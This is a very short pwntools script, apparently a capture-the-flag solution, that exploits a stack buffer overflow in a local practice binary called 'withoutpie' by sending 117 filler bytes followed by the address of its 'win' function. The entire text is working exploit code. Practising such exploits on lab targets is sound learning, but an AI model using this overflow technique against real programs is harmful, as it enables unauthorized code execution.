from pwn import *
p = process('./withoutpie')
elf=ELF("./withoutpie")
payload = b's'*117+p32(elf.sym.win)
p.sendline(payload)
p.interactive()
